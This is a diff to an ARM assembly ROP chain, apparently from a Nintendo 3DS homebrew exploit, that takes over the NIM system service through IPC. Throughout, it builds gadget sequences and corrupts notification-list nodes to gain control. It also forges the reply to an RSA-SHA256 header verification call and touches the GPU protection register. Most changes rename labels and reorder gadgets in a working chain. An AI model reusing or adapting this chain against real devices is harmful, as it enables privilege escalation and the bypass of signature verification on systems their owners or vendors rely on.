@@ -241,7 +241,7 @@ NIMS_0x5E_ROP_TakeOver:
 	svcReplyAndReceive_Handles .LZero, ROP_ABSTRACT_ADDR(.LSVC0x4F_handles+4)
 	@ expecting cmd 0x2
 	Copy_From_TlsCMDBuf ROP_ABSTRACT_ADDR(.LCMDBUF_WorkSpace), 0x100
-	WordPtrsCMP_PIVOT_FAIL ROP_ABSTRACT_ADDR(.LCMDBUF_WorkSpace), ROP_ABSTRACT_ADDR(.PS_VerifyRsaSha256Header), ROP_ABSTRACT_ADDR(.LPivot_Critical_Failed)
+	WordPtrsCMP_PIVOT_FAIL ROP_ABSTRACT_ADDR(.LCMDBUF_WorkSpace), ROP_ABSTRACT_ADDR(.LPS_VerifyRsaSha256Header), ROP_ABSTRACT_ADDR(.LPivot_Critical_Failed)
 	.word ROP_POPR0PC @ pc
 	.word ROP_ABSTRACT_ADDR(.LCMDBUF_WorkSpace + 4*13) @ r0
 	.word ROP_LDR_R0FROMR0_POPR4PC @ pc
@@ -258,34 +258,24 @@ NIMS_0x5E_ROP_TakeOver:
 	.word ROP_GARBAGE @ r4
 	WordPtrsCMP_PIVOT_FAIL ROP_ABSTRACT_ADDR(.LTmpCmpVar), ROP_ABSTRACT_ADDR(.LComparable_zero), ROP_ABSTRACT_ADDR(.LPivot_Critical_Failed)
 	.word ROP_POPR1R2R3PC @ pc
-	.word ROP_ABSTRACT_ADDR(.Ldsp_rop_notif_start) @ r1 - to str vtable later
+	.word ROP_ABSTRACT_ADDR(1f) @ r1 - to update memcpy's r0 rop
 	.word ROP_GARBAGE @ r2
-	.word ROP_ABSTRACT_ADDR(1f) @ r3 - to update memcpy's r0 rop
+	.word ROP_ABSTRACT_ADDR(.-4) @ r3
 	.word ROP_POPR0PC @ pc
 	.word ROP_ABSTRACT_ADDR(.LCMDBUF_WorkSpace + 4*13) @ r0
 	.word ROP_LDR_R0FROMR0_POPR4PC @ pc
+	.word ROP_GARBAGE @ r4
+	.word ROP_STR_R0TOR1_POPR4PC @ pc
 	.word 0xEA0 - 0xAB8 @ r4
 	.word ROP_ADDR0_R4_STR_R0TOR3_POPR4PC @ pc
 	.word ROP_GARBAGE @ r4
-	.word ROP_LDR_R0FROMR0_POPR4PC @ pc - loading vtable ptr
-	.word ROP_GARBAGE @ r4
-	.word ROP_STR_R0TOR1_POPR4PC @ pc
-	.word ROP_GARBAGE @ r4
-	.word ROP_POPR1PC @ pc
-	.word ROP_ABSTRACT_ADDR(.Ldsp_rop_notif_start + 4*4) @ r1
-	.word ROP_STR_R0TOR1_POPR4PC @ pc
-	.word ROP_GARBAGE @ r4
-	.word ROP_POPR0PC @ pc
-	1:
-	.word 0xBEEFBEEF @ r0
 	.word ROP_POPR1R2R3PC @ pc
 	.word ROP_ABSTRACT_ADDR(.Ldsp_notif_manager_start) @ r1
 	.word .Ldsp_notif_manager_end - .Ldsp_notif_manager_start @ r2
 	.word ROP_GARBAGE @ r3
 	.word ROP_MEMCPY_POPR0PC @ bl memcpy, pop {r0, pc}
-	.word ROP_ABSTRACT_ADDR(.LCMDBUF_WorkSpace + 4*13) @ r0
-	.word ROP_LDR_R0FROMR0_POPR4PC @ pc
-	.word ROP_GARBAGE @ r4
+	1:
+	.word 0xBEEFBEEF @ r0
 	.word ROP_POPR1R2R3PC @ pc
 	.word ROP_ABSTRACT_ADDR(.Ldsp_rop_notif_start) @ r1
 	.word .Ldsp_rop_notif_end - .Ldsp_rop_notif_start @ r2
@@ -295,10 +285,10 @@ NIMS_0x5E_ROP_TakeOver:
 	.word ROP_LDR_R0FROMR0_POPR4PC @ pc
 	.word ROP_GARBAGE @ r4
 	.word ROP_POPR1PC @ pc
-	.word ROP_ABSTRACT_ADDR(.PS_VerifyRsaSha256Header_Response + 4*3) @ r1
+	.word ROP_ABSTRACT_ADDR(.LPS_VerifyRsaSha256Header_Response + 4*3) @ r1
 	.word ROP_STR_R0TOR1_POPR4PC @ pc
 	.word ROP_GARBAGE @ r4
-	Copy_To_TlsCMDBuf ROP_ABSTRACT_ADDR(.PS_VerifyRsaSha256Header_Response), (.PS_VerifyRsaSha256Header_Response_end - .PS_VerifyRsaSha256Header_Response)
+	Copy_To_TlsCMDBuf ROP_ABSTRACT_ADDR(.LPS_VerifyRsaSha256Header_Response), (.LPS_VerifyRsaSha256Header_Response_end - .LPS_VerifyRsaSha256Header_Response)
 	svcReplyAndReceive_Handles ROP_ABSTRACT_ADDR(.LSVC0x4F_handles+4), ROP_ABSTRACT_ADDR(.LSVC0x4F_handles+8)
 	@ cleaning!
 	.word ROP_POPR0PC @ pc
@@ -408,18 +398,19 @@ NIMS_0x5E_ROP_TakeOver:
 	@ [0]
 	.word 0 @ vtable
 	1:
-	.word (REL_FIXED_ADDR_ROPNOTIF(3f) - 0x0FFFFF70) + 4 @ node.prev
-	.word REL_FIXED_ADDR_ROPNOTIF(2f) @ node.next
+	.word (REL_FIXED_ADDR_ROPNOTIF(1f) - 0x0FFFFF70) + 4 @ node.prev
+	.word REL_FIXED_ADDR_ROPNOTIF(3f) @ node.next
+	2:
 	.word 0x101B38 @ notificationId
 	@ [1]
-	.word 0 @ vtable
-	2:
+	.word REL_FIXED_ADDR_ROPNOTIF(2b) @ vtable
+	3:
 	.word REL_FIXED_ADDR_ROPNOTIF(1b) @ node.prev
 	.word 0 @ node.next
 	.word 0x100 @ notificationId
 
 	@ rop
-	3:
+	1:
 	.word 0x001015D0 @ pc (reload regs)
 
 	.word 0x1EC40140 @ r4, CFG11_GPUPROT (user virtual address)
@@ -449,7 +440,7 @@ NIMS_0x5E_ROP_TakeOver:
 
 .LCustom0x1001:
 	.word IPC_MakeHeader(0x1001, 0, 0)
-.PS_VerifyRsaSha256Header:
+.LPS_VerifyRsaSha256Header:
 	.word IPC_MakeHeader(0x2, 9, 4)
 
 .LCustom0x1001_Response:
@@ -457,12 +448,12 @@ NIMS_0x5E_ROP_TakeOver:
 	.word 0
 .LCustom0x1001_Response_end:
 
-.PS_VerifyRsaSha256Header_Response:
+.LPS_VerifyRsaSha256Header_Response:
 	.word IPC_MakeHeader(0x2, 1, 2)
 	.word 0xD15EA5E5 @ bail!
 	.word IPC_Desc_Buffer(0x1000 - 0xAB8, IPC_BUFFER_W)
 	.word 0xBEEFBEEF
-.PS_VerifyRsaSha256Header_Response_end:
+.LPS_VerifyRsaSha256Header_Response_end:
 
 .LNIM_0x5E_Response:
 	.word IPC_MakeHeader(0x5e, 2, 0)
